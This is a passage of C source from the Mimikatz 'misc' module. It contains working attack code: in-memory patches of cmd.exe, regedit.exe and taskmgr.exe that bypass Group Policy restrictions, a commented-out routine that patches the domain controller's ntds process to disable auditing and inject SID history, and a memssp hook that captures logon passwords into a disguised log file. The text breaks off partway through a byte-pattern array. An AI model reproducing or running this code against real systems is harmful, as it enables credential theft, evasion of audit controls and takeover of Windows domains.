/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_misc.h"

const KUHL_M_C kuhl_m_c_misc[] = {
	{kuhl_m_misc_cmd,		L"cmd",			L"Command Prompt          (without DisableCMD)"},
	{kuhl_m_misc_regedit,	L"regedit",		L"Registry Editor         (without DisableRegistryTools)"},
	{kuhl_m_misc_taskmgr,	L"taskmgr",		L"Task Manager            (without DisableTaskMgr)"},
	{kuhl_m_misc_ncroutemon,L"ncroutemon",	L"Juniper Network Connect (without route monitoring)"},
#if !defined(_M_ARM64)
	{kuhl_m_misc_detours,	L"detours",		L"[experimental] Try to enumerate all modules with Detours-like hooks"},
#endif
//#ifdef _M_X64
//	{kuhl_m_misc_addsid,	L"addsid",		NULL},
//#endif
	{kuhl_m_misc_memssp,	L"memssp",		NULL},
	{kuhl_m_misc_skeleton,	L"skeleton",	NULL},
	{kuhl_m_misc_compress,	L"compress",	NULL},
	{kuhl_m_misc_lock,		L"lock",		NULL},
	{kuhl_m_misc_wp,		L"wp",			NULL},
	{kuhl_m_misc_mflt,		L"mflt",		NULL},
	{kuhl_m_misc_easyntlmchall,	L"easyntlmchall", NULL},
	{kuhl_m_misc_clip,		L"clip",		NULL},
	{kuhl_m_misc_xor,		L"xor",			NULL},
	{kuhl_m_misc_aadcookie,	L"aadcookie",	NULL},
	{kuhl_m_misc_aadcookie_NgcSignWithSymmetricPopKey,	L"ngcsign",	NULL},
	{kuhl_m_misc_spooler,	L"spooler",		NULL},
	{kuhl_m_misc_efs,		L"efs",			NULL},
	{kuhl_m_misc_printnightmare,	L"printnightmare",		NULL},
	{kuhl_m_misc_sccm_accounts,	L"sccm",	NULL},
	{kuhl_m_misc_shadowcopies,	L"shadowcopies",	NULL},
	{kuhl_m_misc_djoin_proxy,	L"djoin",	NULL},
	{kuhl_m_misc_citrix_proxy,	L"citrix",	NULL},
};
const KUHL_M kuhl_m_misc = {
	L"misc",	L"Miscellaneous module",	NULL,
	ARRAYSIZE(kuhl_m_c_misc), kuhl_m_c_misc, NULL, NULL
};

NTSTATUS kuhl_m_misc_cmd(int argc, wchar_t * argv[])
{
	kuhl_m_misc_generic_nogpo_patch(L"cmd.exe", L"DisableCMD", sizeof(L"DisableCMD"), L"KiwiAndCMD", sizeof(L"KiwiAndCMD"));
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_misc_regedit(int argc, wchar_t * argv[])
{
	kuhl_m_misc_generic_nogpo_patch(L"regedit.exe", L"DisableRegistryTools", sizeof(L"DisableRegistryTools"), L"KiwiAndRegistryTools", sizeof(L"KiwiAndRegistryTools"));
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_misc_taskmgr(int argc, wchar_t * argv[])
{
	kuhl_m_misc_generic_nogpo_patch(L"taskmgr.exe", L"DisableTaskMgr", sizeof(L"DisableTaskMgr"), L"KiwiAndTaskMgr", sizeof(L"KiwiAndTaskMgr"));
	return STATUS_SUCCESS;
}

BYTE PTRN_WALL_ncRouteMonitor[] = {0x07, 0x00, 0x75, 0x3a, 0x68};
BYTE PATC_WALL_ncRouteMonitor[] = {0x90, 0x90};
KULL_M_PATCH_GENERIC ncRouteMonitorReferences[] = {{KULL_M_WIN_BUILD_XP, {sizeof(PTRN_WALL_ncRouteMonitor), PTRN_WALL_ncRouteMonitor}, {sizeof(PATC_WALL_ncRouteMonitor), PATC_WALL_ncRouteMonitor}, {2}}};
NTSTATUS kuhl_m_misc_ncroutemon(int argc, wchar_t * argv[])
{
	kull_m_patch_genericProcessOrServiceFromBuild(ncRouteMonitorReferences, ARRAYSIZE(ncRouteMonitorReferences), L"dsNcService", NULL, TRUE);
	return STATUS_SUCCESS;
}
#if !defined(_M_ARM64)
BOOL CALLBACK kuhl_m_misc_detours_callback_module_name_addr(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg)
{
	if(((PBYTE) pvArg >= (PBYTE) pModuleInformation->DllBase.address) && ((PBYTE) pvArg < ((PBYTE) pModuleInformation->DllBase.address + pModuleInformation->SizeOfImage)))
	{
		kprintf(L"\t(%wZ)", pModuleInformation->NameDontUseOutsideCallback);
		return FALSE;
	}
	return TRUE;
}

PBYTE kuhl_m_misc_detours_testHookDestination(PKULL_M_MEMORY_ADDRESS base, WORD machineOfProcess, DWORD level)
{
	PBYTE dst = NULL;
	BYTE bufferJmp[] = {0xe9}, bufferJmpOff[] = {0xff, 0x25}, bufferRetSS[]	= {0x50, 0x48, 0xb8};
	KUHL_M_MISC_DETOURS_HOOKS myHooks[] = {
		{0, bufferJmp,		sizeof(bufferJmp),		sizeof(bufferJmp),		sizeof(LONG), TRUE, FALSE},
		{1, bufferJmpOff,	sizeof(bufferJmpOff),	sizeof(bufferJmpOff),	sizeof(LONG), !(machineOfProcess == IMAGE_FILE_MACHINE_I386), TRUE},
		{0, bufferRetSS,	sizeof(bufferRetSS),	sizeof(bufferRetSS),	sizeof(PVOID), FALSE, FALSE},
	};
	KULL_M_MEMORY_ADDRESS aBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, dBuffer = {&dst, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	KULL_M_MEMORY_ADDRESS pBuffer = *base;
	DWORD i, sizeToRead;

	for(i = 0; !dst && (i < ARRAYSIZE(myHooks)); i++)
	{
		if(level >= myHooks[i].minLevel)
		{
			sizeToRead = myHooks[i].offsetToRead + myHooks[i].szToRead;
			if(aBuffer.address = LocalAlloc(LPTR, sizeToRead))
			{
				if(kull_m_memory_copy(&aBuffer, base, sizeToRead))
				{
					if(RtlEqualMemory(myHooks[i].pattern, aBuffer.address, myHooks[i].szPattern))
					{
						if(myHooks[i].isRelative)
						{
							dst = (PBYTE) pBuffer.address + sizeToRead + *(PLONG) ((PBYTE) aBuffer.address + myHooks[i].offsetToRead);
						}
						else
						{
							dst = *(PBYTE *) ((PBYTE) aBuffer.address + myHooks[i].offsetToRead);
#if defined(_M_X64)
							if(machineOfProcess == IMAGE_FILE_MACHINE_I386)
								dst = (PBYTE) ((ULONG_PTR) dst & 0xffffffff);
#endif
						}

						if(myHooks[i].isTarget)
						{
							pBuffer.address = dst;
							kull_m_memory_copy(&dBuffer, &pBuffer, sizeof(PBYTE));
#if defined(_M_X64)
							if(machineOfProcess == IMAGE_FILE_MACHINE_I386)
								dst = (PBYTE) ((ULONG_PTR) dst & 0xffffffff);
#endif

						}
					}
				}
				LocalFree(aBuffer.address);
			}
		}
	}
	return dst;
}

BOOL CALLBACK kuhl_m_misc_detours_callback_module_exportedEntry(PKULL_M_PROCESS_EXPORTED_ENTRY pExportedEntryInformations, PVOID pvArg)
{
	PBYTE dstJmp = NULL;
	KULL_M_MEMORY_ADDRESS pBuffer = pExportedEntryInformations->function;
	DWORD level = 0;

	if((pExportedEntryInformations->function.address))
	{
		do
		{
			pBuffer.address = kuhl_m_misc_detours_testHookDestination(&pBuffer, pExportedEntryInformations->machine, level);
			if(pBuffer.address && ((PBYTE) pBuffer.address < (PBYTE) (((PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION) pvArg)->DllBase.address) || (PBYTE) pBuffer.address > ((PBYTE) ((PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION) pvArg)->DllBase.address + (((PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION) pvArg)->SizeOfImage))))
			{
				dstJmp = (PBYTE) pBuffer.address;
				level++;
			}
		} while (pBuffer.address);

		if(dstJmp)
		{
			kprintf(L"\t[%u] %wZ ! ", level, (((PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION) pvArg)->NameDontUseOutsideCallback));

			if(pExportedEntryInformations->name)
				kprintf(L"%-32S", pExportedEntryInformations->name);
			else
				kprintf(L"# %u", pExportedEntryInformations->ordinal);

			kprintf(L"\t %p -> %p", pExportedEntryInformations->function.address, dstJmp);
			kull_m_process_getVeryBasicModuleInformations(pExportedEntryInformations->function.hMemory, kuhl_m_misc_detours_callback_module_name_addr, dstJmp);
			kprintf(L"\n");
		}
	}
	return TRUE;
}

BOOL CALLBACK kuhl_m_misc_detours_callback_module(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg)
{
	kull_m_process_getExportedEntryInformations(&pModuleInformation->DllBase, kuhl_m_misc_detours_callback_module_exportedEntry, pModuleInformation);
	return TRUE;
}

BOOL CALLBACK kuhl_m_misc_detours_callback_process(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PVOID pvArg)
{
	HANDLE hProcess;
	PKULL_M_MEMORY_HANDLE hMemoryProcess;
	DWORD pid = PtrToUlong(pSystemProcessInformation->UniqueProcessId);

	if(pid > 4)
	{
		kprintf(L"%wZ (%u)\n", &pSystemProcessInformation->ImageName, pid);
		if(hProcess = OpenProcess(GENERIC_READ, FALSE, pid))
		{
			if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &hMemoryProcess))
			{
				kull_m_process_getVeryBasicModuleInformations(hMemoryProcess, kuhl_m_misc_detours_callback_module, NULL);
				kull_m_memory_close(hMemoryProcess);
			}
			CloseHandle(hProcess);
		}
		else PRINT_ERROR_AUTO(L"OpenProcess");
	}
	return TRUE;
}

NTSTATUS kuhl_m_misc_detours(int argc, wchar_t * argv[])
{
	kull_m_process_getProcessInformation(kuhl_m_misc_detours_callback_process, NULL);
	return STATUS_SUCCESS;
}
#endif
BOOL kuhl_m_misc_generic_nogpo_patch(PCWSTR commandLine, PWSTR disableString, SIZE_T szDisableString, PWSTR enableString, SIZE_T szEnableString)
{
	BOOL status = FALSE;
	PEB Peb;
	PROCESS_INFORMATION processInformation;
	PIMAGE_NT_HEADERS pNtHeaders;
	KULL_M_MEMORY_ADDRESS aBaseAdress = {NULL, NULL}, aPattern = {disableString, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aPatch = {enableString, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	KULL_M_MEMORY_SEARCH sMemory;
	
	if(kull_m_process_create(KULL_M_PROCESS_CREATE_NORMAL, commandLine, CREATE_SUSPENDED, NULL, 0, NULL, NULL, NULL, &processInformation, FALSE))
	{
		if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, processInformation.hProcess, &aBaseAdress.hMemory))
		{
			if(kull_m_process_peb(aBaseAdress.hMemory, &Peb, FALSE))
			{
				aBaseAdress.address = Peb.ImageBaseAddress;

				if(kull_m_process_ntheaders(&aBaseAdress, &pNtHeaders))
				{
					sMemory.kull_m_memoryRange.kull_m_memoryAdress.hMemory = aBaseAdress.hMemory;
					sMemory.kull_m_memoryRange.kull_m_memoryAdress.address = (LPVOID) pNtHeaders->OptionalHeader.ImageBase;
					sMemory.kull_m_memoryRange.size = pNtHeaders->OptionalHeader.SizeOfImage;

					if(status = kull_m_patch(&sMemory, &aPattern, szDisableString, &aPatch, szEnableString, 0, NULL, 0, NULL, NULL))
						kprintf(L"Patch OK for \'%s\' from \'%s\' to \'%s\' @ %p\n", commandLine, disableString, enableString, sMemory.result);
					else PRINT_ERROR_AUTO(L"kull_m_patch");
					LocalFree(pNtHeaders);
				}
			}
			kull_m_memory_close(aBaseAdress.hMemory);
		}
		NtResumeProcess(processInformation.hProcess);
		CloseHandle(processInformation.hThread);
		CloseHandle(processInformation.hProcess);
	}
	return status;
}

//#ifdef _M_X64
//BYTE PTRN_JMP[]			= {0xeb};
//BYTE PTRN_6NOP[]		= {0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
//
//BYTE PTRN_WN64_0[]		= {0xb8, 0x56, 0x21, 0x00, 0x00, 0x41}; // IsDomainInForest
//BYTE PTRN_WN64_1[]		= {0xfa, 0x05, 0x1a, 0x01, 0xe9}; // VerifyAuditingEnabled
//BYTE PTRN_WN64_2[]		= {0x48, 0x8b, 0xd7, 0x8b, 0x8c, 0x24}; // VerifySrcAuditingEnabledAndGetFlatName
//BYTE PTRN_WN64_3[]		= {0xff, 0xff, 0x4c, 0x8d, 0x8c, 0x24, 0x88, 0x01, 0x00, 0x00}; // ForceAuditOnSrcObj
//BYTE PTRN_WN64_4[]		= {0x49, 0x8b, 0x48, 0x18, 0x48, 0x8b, 0x84, 0x24, 0x00, 0x04, 0x00, 0x00}; // fNullUuid
//BYTE PTRN_WN64_5[]		= {0xc7, 0x44, 0x24, 0x74, 0x59, 0x07, 0x1a, 0x01, 0xe9}; // cmp r12
//BYTE PTRN_WN64_6[]		= {0xa9, 0xff, 0xcd, 0xff, 0xff, 0x0f, 0x85}; // cmp eax
//BYTE PTRN_WN64_7[]		= {0x8b, 0x84, 0x24, 0x6c, 0x01, 0x00, 0x00, 0x3d, 0xe8, 0x03, 0x00, 0x00, 0x73}; // SampSplitNT4SID
//
//BYTE PTRN_WN81_0[]		= {0xb8, 0x56, 0x21, 0x00, 0x00, 0x41}; // IsDomainInForest
//BYTE PTRN_WN81_1[]		= {0xc2, 0x05, 0x1a, 0x01, 0xe9}; // VerifyAuditingEnabled
//BYTE PTRN_WN81_2[]		= {0x48, 0x8b, 0xd7, 0x8b, 0x8c, 0x24, 0xc0/*, 0x00, 0x00, 0x00*/}; // VerifySrcAuditingEnabledAndGetFlatName
//BYTE PTRN_WN81_3[]		= {0xff, 0xff, 0x4c, 0x8d, 0x8c, 0x24, 0x60, 0x01, 0x00, 0x00}; // ForceAuditOnSrcObj
//BYTE PTRN_WN81_4[]		= {0x49, 0x8b, 0x48, 0x18, 0x48, 0x8b, 0x84, 0x24, 0x00, 0x04, 0x00, 0x00}; // fNullUuid
//BYTE PTRN_WN81_5[]		= {0xc7, 0x44, 0x24, 0x74, 0x1c, 0x07, 0x1a, 0x01, 0xe9}; // cmp r12
//BYTE PTRN_WN81_6[]		= {0xa9, 0xff, 0xcd, 0xff, 0xff, 0x0f, 0x85}; // cmp eax
//BYTE PTRN_WN81_7[]		= {0x8b, 0x84, 0x24, 0x98, 0x01, 0x00, 0x00, 0x3d, 0xe8, 0x03, 0x00, 0x00, 0x73}; // SampSplitNT4SID
//
//BYTE PTRN_WN80_0[]		= {0xb8, 0x56, 0x21, 0x00, 0x00, 0x41}; // IsDomainInForest
//BYTE PTRN_WN80_1[]		= {0xC1, 0x05, 0x1A, 0x01, 0xe9}; // VerifyAuditingEnabled
//BYTE PTRN_WN80_2[]		= {0x48, 0x8b, 0xd7, 0x8b, 0x8c, 0x24, 0xc0/*, 0x00, 0x00, 0x00*/}; // VerifySrcAuditingEnabledAndGetFlatName
//BYTE PTRN_WN80_3[]		= {0xff, 0xff, 0x4c, 0x8d, 0x84, 0x24, 0x58, 0x01, 0x00, 0x00}; // ForceAuditOnSrcObj
//BYTE PTRN_WN80_4[]		= {0x49, 0x8B, 0x41, 0x18, 0x48, 0x8D, 0x8C, 0x24, 0x10, 0x05, 0x00, 0x00}; // fNullUuid
//BYTE PTRN_WN80_5[]		= {0xC7, 0x44, 0x24, 0x74, 0x1b, 0x07, 0x1A, 0x01, 0xE9}; // cmp r12
//BYTE PTRN_WN80_6[]		= {0xa9, 0xff, 0xcd, 0xff, 0xff, 0x0f, 0x85}; // cmp eax
//BYTE PTRN_WN80_7[]		= {0x44, 0x8B, 0x9C, 0x24, 0x9C, 0x01, 0x00, 0x00, 0x41, 0x81, 0xFB, 0xE8, 0x03, 0x00, 0x00, 0x73}; // SampSplitNT4SID
//
//BYTE PTRN_W8R2_0[]		= {0xb8, 0x56, 0x21, 0x00, 0x00, 0x41}; // IsDomainInForest
//BYTE PTRN_W8R2_1[]		= {0x96, 0x05, 0x1a, 0x01, 0x48}; // VerifyAuditingEnabled
////BYTE PTRN_W8R2_2[]		= {0x48, 0x8d, 0x94, 0x24, 0x28, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x8c, 0x24, 0xf8, 0x01, 0x00, 0x00, 0xe8}; // VerifySrcAuditingEnabledAndGetFlatName 2010
//BYTE PTRN_W8R2_2[]		= {0x48, 0x8d, 0x94, 0x24, 0x18, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x8c, 0x24, 0x00, 0x02, 0x00, 0x00, 0xe8}; // VerifySrcAuditingEnabledAndGetFlatName 2013
//BYTE PTRN_W8R2_3[]		= {0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x70, 0x3b, 0xc6, 0x74};
//BYTE PTRN_W8R2_4[]		= {0x05, 0x00, 0x00, 0x48, 0x8b, 0x11, 0x48, 0x3b, 0x50, 0x08, 0x75}; // fNullUuid
//BYTE PTRN_W8R2_5[]		= {0xc7, 0x44, 0x24, 0x74, 0xed, 0x06, 0x1a, 0x01, 0x8b}; // cmp r14
//BYTE PTRN_W8R2_6[]		= {0xa9, 0xff, 0xcd, 0xff, 0xff, 0x0f, 0x85}; // cmp eax
//BYTE PTRN_W8R2_7[]		= {0x01, 0x00, 0x00, 0x41, 0x81, 0xfb, 0xe8, 0x03, 0x00, 0x00, 0x73}; // SampSplitNT4SID
//
//KULL_M_PATCH_MULTIPLE wservprev[] = {
//	{{sizeof(PTRN_WN64_0), PTRN_WN64_0}, {sizeof(PTRN_JMP),  PTRN_JMP},	 -2,},
//	{{sizeof(PTRN_WN64_1), PTRN_WN64_1}, {sizeof(PTRN_JMP),  PTRN_JMP},	-13,},
//	{{sizeof(PTRN_WN64_2), PTRN_WN64_2}, {sizeof(PTRN_6NOP), PTRN_6NOP},-11,},
//	{{sizeof(PTRN_WN64_3), PTRN_WN64_3}, {sizeof(PTRN_6NOP), PTRN_6NOP}, -4,},
//	{{sizeof(PTRN_WN64_4), PTRN_WN64_4}, {sizeof(PTRN_JMP),  PTRN_JMP},	 -2,},
//	{{sizeof(PTRN_WN64_5), PTRN_WN64_5}, {sizeof(PTRN_JMP),  PTRN_JMP},	-16,},
//	{{sizeof(PTRN_WN64_6), PTRN_WN64_6}, {sizeof(PTRN_6NOP), PTRN_6NOP}, 18,},
//	{{sizeof(PTRN_WN64_7), PTRN_WN64_7}, {sizeof(PTRN_JMP),  PTRN_JMP},	 12,},
//};
//KULL_M_PATCH_MULTIPLE w2k12r2[] = {
//	{{sizeof(PTRN_WN81_0), PTRN_WN81_0}, {sizeof(PTRN_JMP),  PTRN_JMP},	 -2,},
//	{{sizeof(PTRN_WN81_1), PTRN_WN81_1}, {sizeof(PTRN_JMP),  PTRN_JMP},	-13,},
//	{{sizeof(PTRN_WN81_2), PTRN_WN81_2}, {sizeof(PTRN_6NOP), PTRN_6NOP},-11,},
//	{{sizeof(PTRN_WN81_3), PTRN_WN81_3}, {sizeof(PTRN_6NOP), PTRN_6NOP}, -4,},
//	{{sizeof(PTRN_WN81_4), PTRN_WN81_4}, {sizeof(PTRN_JMP),  PTRN_JMP},	 -2,},
//	{{sizeof(PTRN_WN81_5), PTRN_WN81_5}, {sizeof(PTRN_JMP),  PTRN_JMP},	-16,},
//	{{sizeof(PTRN_WN81_6), PTRN_WN81_6}, {sizeof(PTRN_6NOP), PTRN_6NOP}, 18,},
//	{{sizeof(PTRN_WN81_7), PTRN_WN81_7}, {sizeof(PTRN_JMP),  PTRN_JMP},	 12,},
//};
//KULL_M_PATCH_MULTIPLE w2k12[] = {
//	{{sizeof(PTRN_WN80_0), PTRN_WN80_0}, {sizeof(PTRN_JMP),  PTRN_JMP},	 -2,},
//	{{sizeof(PTRN_WN80_1), PTRN_WN80_1}, {sizeof(PTRN_JMP),  PTRN_JMP},	-13,},
//	{{sizeof(PTRN_WN80_2), PTRN_WN80_2}, {sizeof(PTRN_6NOP), PTRN_6NOP},-11,},
//	{{sizeof(PTRN_WN80_3), PTRN_WN80_3}, {sizeof(PTRN_6NOP), PTRN_6NOP}, -4,},
//	{{sizeof(PTRN_WN80_4), PTRN_WN80_4}, {sizeof(PTRN_JMP),  PTRN_JMP},	 -2,},
//	{{sizeof(PTRN_WN80_5), PTRN_WN80_5}, {sizeof(PTRN_JMP),  PTRN_JMP},	-16,},
//	{{sizeof(PTRN_WN80_6), PTRN_WN80_6}, {sizeof(PTRN_6NOP), PTRN_6NOP}, 18,},
//	{{sizeof(PTRN_WN80_7), PTRN_WN80_7}, {sizeof(PTRN_JMP),  PTRN_JMP},	 15,},
//};
//KULL_M_PATCH_MULTIPLE w2k8r2[] = {
//	{{sizeof(PTRN_W8R2_0), PTRN_W8R2_0}, {sizeof(PTRN_JMP),  PTRN_JMP},	 -2,},
//	{{sizeof(PTRN_W8R2_1), PTRN_W8R2_1}, {sizeof(PTRN_JMP),  PTRN_JMP},	-14,},
//	{{sizeof(PTRN_W8R2_2), PTRN_W8R2_2}, {sizeof(PTRN_JMP),	 PTRN_JMP},  27,},
//	{{sizeof(PTRN_W8R2_3), PTRN_W8R2_3}, {sizeof(PTRN_JMP),  PTRN_JMP},   9,},
//	{{sizeof(PTRN_W8R2_4), PTRN_W8R2_4}, {sizeof(PTRN_JMP),  PTRN_JMP},	-11,},
//	{{sizeof(PTRN_W8R2_5), PTRN_W8R2_5}, {sizeof(PTRN_JMP),  PTRN_JMP},	-17,},
//	{{sizeof(PTRN_W8R2_6), PTRN_W8R2_6}, {sizeof(PTRN_6NOP), PTRN_6NOP}, 18,},
//	{{sizeof(PTRN_W8R2_7), PTRN_W8R2_7}, {sizeof(PTRN_JMP),  PTRN_JMP},	 20,},
//};
//
//NTSTATUS kuhl_m_misc_addsid(int argc, wchar_t * argv[])
//{
//	SERVICE_STATUS_PROCESS sNtds;
//	HANDLE hProcess, hDs;
//	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iNtds;
//	DWORD i, err;
//
//	KULL_M_MEMORY_ADDRESS sAddress = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aProcess = {NULL, NULL};
//	KULL_M_MEMORY_SEARCH sSearch;
//	BOOL littleSuccess = TRUE;
//	PPOLICY_DNS_DOMAIN_INFO pDnsInfo;
//	PKULL_M_PATCH_MULTIPLE pOs = NULL;
//	DWORD pOsSz = 0;
//
//	if(argc > 1)
//	{
//		if((MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7) && (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8))
//		{
//			pOs = w2k8r2;
//			pOsSz = ARRAYSIZE(w2k8r2);
//		}
//		else if((MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_8) && (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE))
//		{
//			pOs = w2k12;
//			pOsSz = ARRAYSIZE(w2k12);
//		}
//		else if((MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_BLUE) && (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_10))
//		{
//			pOs = w2k12r2;
//			pOsSz = ARRAYSIZE(w2k12r2);
//		}
//		else if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_10)
//		{
//			pOs = wservprev;
//			pOsSz = ARRAYSIZE(wservprev);
//		}
//
//		if(pOs && pOsSz)
//		{
//			if(kull_m_net_getCurrentDomainInfo(&pDnsInfo))
//			{
//				err = DsBindW(NULL, NULL, &hDs);
//				if(err == ERROR_SUCCESS)
//				{
//					if(kull_m_service_getUniqueForName(L"ntds", &sNtds))
//					{
//						if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, sNtds.dwProcessId))
//						{
//							if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &aProcess.hMemory))
//							{
//								if(kull_m_process_getVeryBasicModuleInformationsForName(aProcess.hMemory, L"ntdsai.dll", &iNtds))
//								{
//									sSearch.kull_m_memoryRange.kull_m_memoryAdress = iNtds.DllBase;
//									sSearch.kull_m_memoryRange.size = iNtds.SizeOfImage;
//
//									for(i = 0; (i < pOsSz) && littleSuccess; i++)
//									{
//										littleSuccess = FALSE;
//										pOs[i].LocalBackup.hMemory = &KULL_M_MEMORY_GLOBAL_OWN_HANDLE;
//										pOs[i].LocalBackup.address = NULL;
//										pOs[i].AdressOfPatch.hMemory = aProcess.hMemory;
//										pOs[i].AdressOfPatch.address = NULL;
//										pOs[i].OldProtect = 0;
//
//										sAddress.address = pOs[i].Search.Pattern;
//										if(kull_m_memory_search(&sAddress, pOs[i].Search.Length, &sSearch, TRUE))
//										{
//											if(pOs[i].LocalBackup.address = LocalAlloc(LPTR, pOs[i].Patch.Length))
//											{
//												pOs[i].AdressOfPatch.address = (PBYTE) sSearch.result + pOs[i].Offset;
//												if(!(littleSuccess = kull_m_memory_copy(&pOs[i].LocalBackup, &pOs[i].AdressOfPatch, pOs[i].Patch.Length)))
//												{
//													PRINT_ERROR_AUTO(L"kull_m_memory_copy (backup)");
//													LocalFree(pOs[i].LocalBackup.address);
//													pOs[i].LocalBackup.address = NULL;
//												}
//											}
//										}
//										else
//										{
//											kprintf(L"Search %u : ", i);
//											PRINT_ERROR_AUTO(L"kull_m_memory_search");
//										}
//									}
//
//									if(littleSuccess)
//									{
//										for(i = 0; (i < pOsSz) && littleSuccess; i++)
//										{
//											littleSuccess = FALSE;
//
//											if(kull_m_memory_protect(&pOs[i].AdressOfPatch, pOs[i].Patch.Length, PAGE_EXECUTE_READWRITE, &pOs[i].OldProtect))
//											{
//												sAddress.address = pOs[i].Patch.Pattern;
//												if(!(littleSuccess = kull_m_memory_copy(&pOs[i].AdressOfPatch, &sAddress, pOs[i].Patch.Length)))
//													PRINT_ERROR_AUTO(L"kull_m_memory_copy");
//											}
//											else PRINT_ERROR_AUTO(L"kull_m_memory_protect");
//										}
//									}
//
//									if(littleSuccess)
//									{
//										kprintf(L"SIDHistory for \'%s\'\n", argv[0]);
//										for(i = 1; i < (DWORD) argc; i++)
//										{
//											kprintf(L" * %s\t", argv[i]);
//											err = DsAddSidHistoryW(hDs, 0, pDnsInfo->DnsDomainName.Buffer, argv[i], NULL, NULL, pDnsInfo->DnsDomainName.Buffer, argv[0]);
//											if(err == NO_ERROR)
//												kprintf(L"OK\n");
//											else PRINT_ERROR(L"DsAddSidHistory: 0x%08x (%u)!\n", err, err);
//										}
//									}
//
//									for(i = 0; i < pOsSz; i++)
//									{
//										if(pOs[i].LocalBackup.address)
//										{
//											if(!kull_m_memory_copy(&pOs[i].AdressOfPatch, &pOs[i].LocalBackup, pOs[i].Patch.Length))
//												PRINT_ERROR_AUTO(L"kull_m_memory_copy");
//											LocalFree(pOs[i].LocalBackup.address);
//										}
//										if(pOs[i].OldProtect)
//											kull_m_memory_protect(&pOs[i].AdressOfPatch, pOs[i].Patch.Length, pOs[i].OldProtect, &pOs[i].OldProtect);
//									}
//								}
//								kull_m_memory_close(aProcess.hMemory);
//							}
//							CloseHandle(hProcess);
//						}
//						else PRINT_ERROR_AUTO(L"OpenProcess");
//					}
//					err = DsUnBindW(&hDs);
//				}
//				else PRINT_ERROR(L"DsBind: %08x (%u)!\n", err, err);
//				LsaFreeMemory(pDnsInfo);
//			}
//		} else PRINT_ERROR(L"OS not supported (only w2k8r2 & w2k12r2)\n");
//	} else PRINT_ERROR(L"It requires at least 2 args\n");
//	return STATUS_SUCCESS;
//}
//#endif
typedef NTSTATUS (NTAPI * PSPACCEPTCREDENTIALS)(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials);
typedef FILE * (__cdecl * PFOPEN)(__in_z const char * _Filename, __in_z const char * _Mode);
typedef int (__cdecl * PFWPRINTF)(__inout FILE * _File, __in_z __format_string const wchar_t * _Format, ...);
typedef int (__cdecl * PFCLOSE)(__inout FILE * _File);
#pragma optimize("", off)
NTSTATUS NTAPI misc_msv1_0_SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
{
	FILE * logfile;
	DWORD filename[] = {0x696d696d, 0x2e61736c, 0x00676f6c},
		append = 0x00000061,
		format[] = {0x0025005b, 0x00380030, 0x003a0078, 0x00300025, 0x00780038, 0x0020005d, 0x00770025, 0x005c005a, 0x00770025, 0x0009005a, 0x00770025, 0x000a005a, 0x00000000};

	if(logfile = ((PFOPEN) 0x4141414141414141)((PCHAR) filename, (PCHAR) &append))
	{	
		((PFWPRINTF) 0x4242424242424242)(logfile, (PWCHAR) format, PrimaryCredentials->LogonId.HighPart, PrimaryCredentials->LogonId.LowPart, &PrimaryCredentials->DomainName, &PrimaryCredentials->DownlevelName, &PrimaryCredentials->Password);
		((PFCLOSE) 0x4343434343434343)(logfile);
	}
	return ((PSPACCEPTCREDENTIALS) 0x4444444444444444)(LogonType, AccountName, PrimaryCredentials, SupplementalCredentials);
}
DWORD misc_msv1_0_SpAcceptCredentials_end(){return 'mssp';}
#pragma optimize("", on)

#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
BYTE INSTR_JMP[]= {0xff, 0x25, 0x00, 0x00, 0x00, 0x00}; // need 14
BYTE PTRN_WIN5_MSV1_0[]	= {0x49, 0x8b, 0xd0, 0x4d, 0x8b, 0xc1, 0xeb, 0x08, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x89, 0x4c, 0x24, 0x08}; // damn short jump!
BYTE PTRN_WI6X_MSV1_0[]	= {0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xd9, 0x49, 0x8b, 0xf8, 0x8b, 0xf1, 0x48};
